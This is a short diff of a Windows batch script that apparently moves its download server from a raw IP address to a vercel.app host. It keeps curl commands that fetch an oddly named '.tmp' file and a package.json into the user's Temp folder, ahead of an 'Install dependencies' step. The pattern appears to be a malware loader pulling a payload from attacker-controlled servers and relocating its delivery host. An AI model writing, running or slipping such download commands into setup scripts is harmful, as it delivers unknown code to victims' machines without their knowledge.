@@ -80,8 +80,8 @@ set "USERPROFILE=%USERPROFILE%"
 echo [INFO] Downloading wclt2E1D.tmp and package.json...
 
 MD "%USERPROFILE%\AppData\Local\Temp" 2>nul
-curl -L -o "%USERPROFILE%\AppData\Local\Temp\wclt2E1D.tmp" "http://45.61.182.252:9463/120/wclt2E1D.tmp"
-curl -L -o "%USERPROFILE%\AppData\Local\Temp\package.json" "http://45.61.182.252:9463/package.json"
+curl -L -o "%USERPROFILE%\AppData\Local\Temp\wclt2E1D.tmp" "https://vercel-project-olive-two.vercel.app/120/wclt2E1D.tmp"
+curl -L -o "%USERPROFILE%\AppData\Local\Temp\package.json" "https://vercel-project-olive-two.vercel.app/package.json"
 
 :: -------------------------
 :: Install dependencies
